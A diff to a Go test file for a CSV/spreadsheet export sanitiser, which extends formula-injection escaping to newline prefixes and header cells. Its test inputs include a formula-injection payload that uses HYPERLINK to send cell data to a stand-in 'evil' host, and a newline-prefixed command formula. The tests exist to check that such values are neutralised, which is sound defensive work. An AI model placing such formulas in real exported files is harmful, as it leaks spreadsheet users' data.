@@ -54,13 +54,13 @@ func TestExportEscapesFormulaPrefixes(t *testing.T) {
 			t.Errorf("ExportSafeValue(%s) = %q, want %q", c.JSON, got, c.Safe)
 		}
 	}
-	// The injection prefix set is exactly = + - @ TAB CR, tested on the first character only.
-	for _, p := range []string{"=", "+", "-", "@", "\t", "\r"} {
+	// The injection prefix set is = + - @ TAB CR and (hardening beyond Python) LF, tested on the first character only.
+	for _, p := range []string{"=", "+", "-", "@", "\t", "\r", "\n"} {
 		if got := ExportSafeValue(p + "x"); got != "'"+p+"x" {
 			t.Errorf("prefix %q not escaped: %q", p, got)
 		}
 	}
-	for _, s := range []string{" =x", "x=", "\n=x", "'=x", "0"} {
+	for _, s := range []string{" =x", "x=", "'=x", "0"} {
 		if got := ExportSafeValue(s); got != s {
 			t.Errorf("%q changed to %q", s, got)
 		}
@@ -139,5 +139,28 @@ func TestObjStringsUsePythonEscaping(t *testing.T) {
 	}
 	if !strings.Contains(string(b), "\u2028") {
 		t.Error("U+2028 must stay raw like Python's ensure_ascii=False")
+	}
+}
+
+// Header cells are free text set by any editor: they get the same formula guard as values
+// (hardening beyond Python).
+func TestExportHeaderCellIsNeutralised(t *testing.T) {
+	for name, want := range map[string]string{
+		`=HYPERLINK("http://evil/?"&A1,"x")`: `'=HYPERLINK("http://evil/?"&A1,"x")`,
+		"@SUM(A1)":                           "'@SUM(A1)",
+		"\n=cmd":                             "'\n=cmd",
+		"Plain name":                         "Plain name",
+	} {
+		col := NewObj()
+		col.Set("id", "c1")
+		col.Set("name", name)
+		if got := exportHeaderCell(Column{col}); got != want {
+			t.Errorf("header %q = %q, want %q", name, got, want)
+		}
+	}
+	col := NewObj()
+	col.Set("id", "=id1")
+	if got := exportHeaderCell(Column{col}); got != "'=id1" {
+		t.Errorf("id fallback = %q", got)
 	}
 }
